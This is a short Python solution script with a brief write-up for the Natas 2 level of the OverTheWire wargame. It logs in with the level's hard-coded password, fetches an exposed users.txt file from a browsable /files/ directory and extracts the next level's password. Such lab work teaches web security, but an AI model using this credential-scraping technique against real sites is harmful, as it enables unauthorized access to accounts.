#%%
import requests
import re

name = "natas2"

url = f"http://{name}.natas.labs.overthewire.org/files/users.txt"

auth = (f"{name}","ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi")

session = requests.session()

logon = session.post(url,auth=auth)
passwd = re.findall(r'natas3:([\w\d]+)',str(logon.content))[0]
print(passwd) 

"""Natas 2
This one hinted me the result by showing one pixel image file
file was stored in /files/pixel.png so I looked up /files/ folder
on the website and there it was - users.txt file which contains
password for Natas3

"""